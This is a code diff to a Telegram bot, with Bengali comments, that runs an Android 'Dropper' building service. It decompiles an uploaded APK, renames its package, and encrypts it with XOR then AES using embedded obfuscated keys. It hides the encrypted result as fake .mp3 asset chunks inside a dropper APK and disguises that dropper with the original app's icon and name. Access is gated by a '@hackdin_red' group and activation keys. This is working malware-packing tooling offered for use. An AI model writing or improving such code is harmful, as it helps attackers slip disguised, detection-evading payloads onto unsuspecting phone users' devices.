@@ -22,17 +22,14 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 
-# ----- সেমাফোর -----
 processing_semaphore = asyncio.Semaphore(1)
 
-# ----- লগিং -----
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-# ----- Flask -----
 app = Flask(__name__)
 
 @app.route('/')
@@ -43,19 +40,17 @@ def home():
 def health():
     return "OK"
 
-# ----- কনফিগারেশন -----
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 if not BOT_TOKEN:
-    logger.error("❌ BOT_TOKEN environment variable not set!")
+    logger.error("❌ BOT_TOKEN missing!")
 else:
-    logger.info(f"✅ BOT_TOKEN loaded (first 5 chars: {BOT_TOKEN[:5]}...)")
+    logger.info(f"✅ BOT_TOKEN loaded.")
 
 REQUIRED_GROUP = "@hackdin_red"
 GROUP_INVITE_LINK = "https://t.me/hackdin_red"
 DAILY_LIMIT = 1
 ADMIN_USER_ID = 6593195102
 
-# ----- ক্রিপ্টো -----
 OBFUSCATED_AES_KEY_B64 = "Xe53JgjByDVFfeZl9W+TyCcATz4ux1PHf9Mih7Vsre0="
 OBFUSCATED_XOR_KEY_B64 = "W5MCyVrJGGKwWtgXFNS6PvlaH1Xivh/MHO8T+PIhKMd7Eb8+R4NmX23lQBNVefrFbSmG+jNjxZCHBxVos/irfbjkBdfFmp1YIXlQXTXO/HUTCLDghib+WSmsdR4BPVDVQaXHBkclBjuhChvOCSnYolaowwAEkpLlMmfPM0+gkV9NHys8e85JEjmBg5izx48HVVifiL4YhsuxWlKJLfLHodezX2v93DIztfL+UAzGHxtOHfwRagmedxyX+jD18GfpFmLO6GjlUTiymXzGu0uRFuwAd4+o70Yf0Istzoj8h7Az1J33aTQFF5XKAu32zetVnMG1bFQSaQcfm9U1vWcFC0F6ArJNxES6Tar8Bg=="
 
@@ -74,7 +69,6 @@ NUM_PARTS = 15
 PREFIX = "part_"
 TARGET_PACKAGE = "com.meteah.apl"
 
-# ----- ডাটাবেস -----
 DB_PATH = 'db/keys.db'
 os.makedirs('db', exist_ok=True)
 
@@ -181,15 +175,17 @@ def mark_asked_to_join(user_id):
     conn.commit()
     conn.close()
 
-# ----- এনক্রিপশন (XOR → AES) - মেমোরি অপটিমাইজড (চাঙ্ক লিস্ট ছাড়া) -----
 def process_encryption(apk_data: bytes, assets_dir: str):
     xor_step = xor_data(apk_data, ACTUAL_XOR_KEY)
     iv_bytes = bytes.fromhex(IV_HEX)
     cipher = AES.new(ACTUAL_AES_KEY, AES.MODE_CBC, iv_bytes)
     encrypted_full = cipher.encrypt(pad(xor_step, AES.block_size))
     chunk_size = len(encrypted_full) // NUM_PARTS + 1
-    os.makedirs(assets_dir, exist_ok=True)
-    
+    chunks = []
+    for i in range(NUM_PARTS):
+        start = i * chunk_size
+        end = min(start + chunk_size, len(encrypted_full))
+        chunks.append(encrypted_full[start:end])
     meta = {
         "build_id": ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
         "timestamp": int(time.time()),
@@ -204,30 +200,22 @@ def process_encryption(apk_data: bytes, assets_dir: str):
         "entropy_seed": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
         "v3_flag": True
     }
+    os.makedirs(assets_dir, exist_ok=True)
     with open(os.path.join(assets_dir, 'manifest.json'), 'w') as f:
         json.dump(meta, f, indent=4)
-    
-    # চাঙ্কগুলো সরাসরি ফাইলে লেখা (মেমোরিতে লিস্ট না রেখে)
-    for i in range(NUM_PARTS):
-        start = i * chunk_size
-        end = min(start + chunk_size, len(encrypted_full))
-        chunk = encrypted_full[start:end]
+    for i, chunk in enumerate(chunks):
         with open(os.path.join(assets_dir, f"{PREFIX}{i}.mp3"), 'wb') as f:
-            f.write(chunk)
-        del chunk  # ফ্রি মেমোরি
-    del encrypted_full, xor_step  # ফ্রি মেমোরি
+            f.write(bytes(chunk))
     return meta
 
-# ----- সাইন ফাংশন (ভেরিফিকেশন বাদ) -----
 async def sign_apk(apk_path, chat_id, context, keystore_path, password):
     cmd = f"apksigner sign --ks {keystore_path} --ks-pass pass:{password} --v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true --v4-signing-enabled true {apk_path}"
-    proc = subprocess.run(cmd, shell=True, capture_output=False, timeout=600)  # capture_output=False মেমোরি বাঁচায়
+    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
     if proc.returncode != 0:
-        await context.bot.send_message(chat_id, f"❌ Signing failed: error code {proc.returncode}")
+        await context.bot.send_message(chat_id, f"❌ Signing failed:\n{proc.stderr[:500]}")
         return False
     return True
 
-# ----- মেসেজ পাঠানোর হেল্পার -----
 async def send_progress(chat_id, text, context, delay=0.2):
     try:
         await context.bot.send_message(chat_id, text)
@@ -235,7 +223,6 @@ async def send_progress(chat_id, text, context, delay=0.2):
     except Exception:
         pass
 
-# ----- APK প্রসেসিং (মেমোরি অপটিমাইজড) -----
 async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, apk_data: bytes):
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
@@ -246,25 +233,21 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
         input_apk = os.path.join(work_dir, 'input.apk')
         with open(input_apk, 'wb') as f:
             f.write(apk_data)
-        # মেমোরি থেকে apk_data ডিলিট (ফাইলে লেখা হয়ে গেছে)
         del apk_data
-        gc.collect()
 
         # ---- ১. ইউজার APK ডিকম্পাইল ----
         await send_progress(chat_id, "📖 Decoding user APK...", context)
         decoded_user = os.path.join(work_dir, 'decoded_user')
         proc = subprocess.run(
-            f"apktool d -f -o {decoded_user} {input_apk}",
-            shell=True, capture_output=False, timeout=300
+            f"apktool d -f --no-src -o {decoded_user} {input_apk}",
+            shell=True, capture_output=True, text=True, timeout=300
         )
         if proc.returncode != 0:
-            await context.bot.send_message(chat_id, f"❌ Decode user APK failed: error code {proc.returncode}")
+            await context.bot.send_message(chat_id, f"❌ Decode user APK failed:\n{proc.stderr[:500]}")
             return
-        del proc
-        gc.collect()
         await send_progress(chat_id, "✅ User APK decoded.", context)
 
-        # নাম বের করা
+        # নাম ও আইকন কপি (আমরা res_user থেকে icon কপি করে রাখব)
         app_name = "App"
         strings_path = os.path.join(decoded_user, 'res/values/strings.xml')
         if os.path.exists(strings_path):
@@ -276,11 +259,25 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                     if string.get('name') == 'app_name':
                         app_name = string.text
                         break
-                del tree, root
             except:
                 pass
 
-        # ---- শুধুমাত্র Manifest-এর package অ্যাট্রিবিউট পরিবর্তন ----
+        # icons কপি করে work_dir-এ রাখি (যাতে পরে Dropper-এ কপি করতে পারি)
+        icons_temp = os.path.join(work_dir, 'icons')
+        os.makedirs(icons_temp, exist_ok=True)
+        res_user = os.path.join(decoded_user, 'res')
+        if os.path.exists(res_user):
+            for root, dirs, files in os.walk(res_user):
+                for d in dirs:
+                    if d.startswith('drawable') or d.startswith('mipmap'):
+                        src = os.path.join(root, d)
+                        dst = os.path.join(icons_temp, d)
+                        os.makedirs(dst, exist_ok=True)
+                        for f in os.listdir(src):
+                            if f.endswith('.png'):
+                                shutil.copy2(os.path.join(src, f), dst)
+
+        # শুধু package অ্যাট্রিবিউট পরিবর্তন
         await send_progress(chat_id, f"🔧 Changing package name to {TARGET_PACKAGE}...", context)
         manifest_path = os.path.join(decoded_user, 'AndroidManifest.xml')
         if os.path.exists(manifest_path):
@@ -289,20 +286,17 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             content = re.sub(r'package="[^"]*"', f'package="{TARGET_PACKAGE}"', content)
             with open(manifest_path, 'w', encoding='utf-8') as f:
                 f.write(content)
-            del content
 
         # রিকম্পাইল ইউজার APK
         await send_progress(chat_id, "🛠 Rebuilding user APK...", context)
         modified_apk = os.path.join(work_dir, 'modified_user.apk')
         proc = subprocess.run(
             f"apktool b -o {modified_apk} {decoded_user}",
-            shell=True, capture_output=False, timeout=300
+            shell=True, capture_output=True, text=True, timeout=300
         )
         if proc.returncode != 0:
-            await context.bot.send_message(chat_id, f"❌ Rebuild user APK failed: error code {proc.returncode}")
+            await context.bot.send_message(chat_id, f"❌ Rebuild user APK failed:\n{proc.stderr[:500]}")
             return
-        del proc
-        gc.collect()
         await send_progress(chat_id, "✅ User APK rebuilt.", context)
 
         # সাইন ইউজার APK
@@ -322,11 +316,13 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             return
         await send_progress(chat_id, "✅ User APK signed.", context)
 
-        # এনক্রিপ্ট ইউজার APK (ফাইল থেকে পড়ে)
+        # ইউজার APK এনক্রিপ্ট
         await send_progress(chat_id, "🔐 Encrypting user APK...", context)
         with open(modified_apk, 'rb') as f:
             modified_apk_data = f.read()
-        # modified_apk ফাইলটি এখনও দরকার নেই, ডিলিট করা যেতে পারে (ডিরেক্টরি শেষে ডিলিট হবে)
+        # এখন decoded_user ডিলিট করে দিই (মেমোরি)
+        shutil.rmtree(decoded_user, ignore_errors=True)
+        gc.collect()
 
         # ---- ২. Dropper প্রসেসিং ----
         await send_progress(chat_id, "📖 Decoding Dropper APK...", context)
@@ -336,38 +332,34 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             return
         decoded_dropper = os.path.join(work_dir, 'decoded_dropper')
         proc = subprocess.run(
-            f"apktool d -f -o {decoded_dropper} {dropper_apk}",
-            shell=True, capture_output=False, timeout=300
+            f"apktool d -f --no-src -o {decoded_dropper} {dropper_apk}",
+            shell=True, capture_output=True, text=True, timeout=300
         )
         if proc.returncode != 0:
-            await context.bot.send_message(chat_id, f"❌ Dropper decode failed: error code {proc.returncode}")
+            await context.bot.send_message(chat_id, f"❌ Dropper decode failed:\n{proc.stderr[:500]}")
             return
-        del proc
-        gc.collect()
         await send_progress(chat_id, "✅ Dropper APK decoded.", context)
 
-        # অ্যাসেট রিপ্লেস (এখন process_encryption মেমোরি অপটিমাইজড)
+        # অ্যাসেট রিপ্লেস
         await send_progress(chat_id, "📦 Replacing assets...", context)
         assets_dir = os.path.join(decoded_dropper, 'assets')
         process_encryption(modified_apk_data, assets_dir)
-        # এনক্রিপ্ট করা ডেটা আর দরকার নেই
         del modified_apk_data
         gc.collect()
 
-        # ইউজারের নাম ও আইকন কপি
+        # ইউজারের আইকন কপি
         await send_progress(chat_id, "🎨 Copying user icon/name...", context)
-        res_user = os.path.join(decoded_user, 'res')
         res_dropper = os.path.join(decoded_dropper, 'res')
-        if os.path.exists(res_user):
-            for root, dirs, files in os.walk(res_user):
+        if os.path.exists(icons_temp):
+            for root, dirs, files in os.walk(icons_temp):
                 for d in dirs:
-                    if d.startswith('drawable') or d.startswith('mipmap'):
-                        src = os.path.join(root, d)
-                        dst = os.path.join(res_dropper, d)
-                        os.makedirs(dst, exist_ok=True)
-                        for f in os.listdir(src):
-                            if f.endswith('.png'):
-                                shutil.copy2(os.path.join(src, f), dst)
+                    src = os.path.join(root, d)
+                    dst = os.path.join(res_dropper, d)
+                    os.makedirs(dst, exist_ok=True)
+                    for f in os.listdir(src):
+                        if f.endswith('.png'):
+                            shutil.copy2(os.path.join(src, f), dst)
+        # strings.xml আপডেট
         strings_dst = os.path.join(decoded_dropper, 'res/values/strings.xml')
         if os.path.exists(strings_dst):
             try:
@@ -379,11 +371,10 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                         string.text = app_name
                         break
                 tree.write(strings_dst)
-                del tree, root
             except:
                 pass
 
-        # Dropper-এর manifest-এ শুধু label/icon সেট
+        # Dropper manifest label/icon
         manifest_dropper = os.path.join(decoded_dropper, 'AndroidManifest.xml')
         if os.path.exists(manifest_dropper):
             with open(manifest_dropper, 'r', encoding='utf-8') as f:
@@ -398,29 +389,26 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                 content = content.replace('<application ', '<application android:icon="@drawable/img" ')
             with open(manifest_dropper, 'w', encoding='utf-8') as f:
                 f.write(content)
-            del content
 
         # রিকম্পাইল Dropper
         await send_progress(chat_id, "🛠 Rebuilding Dropper APK...", context)
         output_apk = os.path.join(work_dir, 'output.apk')
         proc = subprocess.run(
             f"apktool b -o {output_apk} {decoded_dropper}",
-            shell=True, capture_output=False, timeout=300
+            shell=True, capture_output=True, text=True, timeout=300
         )
         if proc.returncode != 0:
-            await context.bot.send_message(chat_id, f"❌ Rebuild Dropper failed: error code {proc.returncode}")
+            await context.bot.send_message(chat_id, f"❌ Rebuild Dropper failed:\n{proc.stderr[:500]}")
             return
-        del proc
-        gc.collect()
         await send_progress(chat_id, "✅ Dropper APK rebuilt.", context)
 
-        # ---- অ্যালাইনমেন্ট (zipalign) ----
+        # অ্যালাইনমেন্ট
         await send_progress(chat_id, "📦 Aligning APK...", context)
         aligned_apk = os.path.join(work_dir, 'aligned.apk')
         try:
             subprocess.run(
                 f"zipalign -v -p 4 {output_apk} {aligned_apk}",
-                shell=True, check=True, timeout=120, capture_output=False
+                shell=True, check=True, timeout=120
             )
         except Exception as e:
             await context.bot.send_message(chat_id, f"❌ Alignment failed: {str(e)}")
@@ -435,7 +423,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
 
         final_apk = aligned_apk
 
-        # ---- ফাইল সাইজ চেক ----
+        # ফাইল সাইজ চেক
         file_size = os.path.getsize(final_apk)
         file_size_mb = file_size / (1024 * 1024)
         if file_size_mb > 50:
@@ -444,12 +432,11 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                 f"⚠️ APK size is {file_size_mb:.1f} MB, which exceeds Telegram's 50 MB limit.\n"
                 "Please use a smaller APK or compress it."
             )
-            shutil.rmtree(work_dir)
             return
 
         await send_progress(chat_id, f"📦 Sending APK ({file_size_mb:.1f} MB)...", context)
 
-        # ---- পাঠানো ----
+        # পাঠানো
         try:
             with open(final_apk, 'rb') as f:
                 await context.bot.send_document(
@@ -461,8 +448,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             await context.bot.send_message(chat_id, f"❌ Send failed: {str(e)[:200]}")
             logger.error(f"send_document failed: {e}")
 
-        # সব কাজ শেষ, ডিরেক্টরি ডিলিট
-        shutil.rmtree(work_dir)
+        shutil.rmtree(work_dir, ignore_errors=True)
         gc.collect()
         logger.info(f"APK processing complete for user {user_id}")
 
@@ -566,13 +552,12 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         file = await update.message.document.get_file()
         apk_data = await file.download_as_bytearray()
         increment_use(user_id)
-        # সেমাফোর দিয়ে একসাথে একটি প্রসেস
         async with processing_semaphore:
             await process_apk_file(update, context, apk_data)
     except Exception as e:
         await update.message.reply_text(f"❌ Failed to download: {str(e)}")
 
-# ----- অ্যাক্টিভেট -----
+# ----- অন্যান্য কমান্ড (অপরিবর্তিত) -----
 async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if not args:
@@ -585,7 +570,6 @@ async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("❌ Invalid key. Contact @Red_teem.")
 
-# ----- অ্যাডমিন -----
 async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_USER_ID:
         await update.message.reply_text("❌ Unauthorized.")
@@ -609,12 +593,10 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/help - This help"
     )
 
-# ----- Flask-কে থ্রেডে চালানোর ফাংশন -----
 def run_flask():
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
 
-# ----- বট রান (মেইন থ্রেডে) -----
 def run_bot():
     try:
         init_db()
@@ -643,7 +625,6 @@ def run_bot():
     except Exception as e:
         logger.error(f"Bot crashed: {e}")
 
-# ----- মেইন -----
 if __name__ == "__main__":
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
